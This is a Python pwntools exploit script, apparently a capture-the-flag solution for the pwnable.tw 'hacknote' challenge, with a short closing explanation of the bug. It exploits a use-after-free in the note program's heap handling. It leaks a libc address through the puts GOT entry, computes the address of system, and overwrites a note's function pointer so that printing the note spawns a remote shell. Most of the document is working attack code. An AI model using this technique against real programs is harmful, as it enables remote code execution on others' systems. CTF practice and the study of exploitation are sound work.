from pwn import *

context(os='linux', arch='i386')
r = remote("chall.pwnable.tw", 10102)

# r = process('./hacknote', env={"LD_PRELOAD":"./libc_32.so.6"})
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript='''
#                                     b *0x080487DB''')
libc = ELF('./libc_32.so.6')

system_offset = libc.symbols['system'] 
puts_offset = libc.symbols['puts']
puts_func = 0x0804862b
puts_got = 0x0804A024

def addnote(size, content):
    r.recvuntil("choice :")
    r.sendline("1")
    r.recvuntil("size :")
    r.sendline(str(size))
    r.recvuntil("Content :")
    r.sendline(content)

def delnote(idx):
    r.recvuntil("choice :")
    r.sendline("2")
    r.recvuntil("Index :")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil("choice :")
    r.sendline("3")
    r.recvuntil("Index :")
    r.sendline(str(idx))

def solve():
    addnote(32, "")     # note 0
    addnote(100, "")    # note 1

    delnote(0)
    delnote(1)

    addnote(8, p32(puts_func) + p32(puts_got))      # note 2 (overwrite payload to note 0)
    
    # leak puts address    
    printnote(0)                                    
    # calculate libc base address
    puts_addr = u32(r.recv(4))
    libc_base = puts_addr - puts_offset
    log.info("libc base %s" % hex(libc_base))
    system_addr = libc_base + system_offset

    delnote(2)  # free note 2, so 2 modified chunks will be in fastbins

    # get shell 
    addnote(8, p32(system_addr) + ";sh;") # note 3
    printnote(0) # trigger system(sh)

    r.interactive()

if __name__ == '__main__':
    solve()

"""
_ function delete_note free chunk but not set pointer to null => uaf
_ allocate 2 notes 
_ so there are 2 chunks with 8 bytes (puts_addr, content_addr) and 2 chunks different chunks (contents of 2 notes)
_ release note 0 and note 1 in that order
_ allocate 1 note with 8 bytes length in content, so we will need 2 chunks with 8 bytes
_ malloc reuse the 2 chunks of 2 old notes in fastbin
_ so the structure of note 2 will be: 8 bytes (note 1) -> 8 bytes (note 0)
_ so if we write content to note 2, it will be written in note 0 => write puts_func and puts_got in note 0 
=> when print note 0 it will print address of puts_got instead of old content off note 0 => calculate libc base and system address
_ free note 2, then create note3 and write to its content system_addr + ";sh;" => this note still has same structure with note 2
_ print note 0 to get shell
"""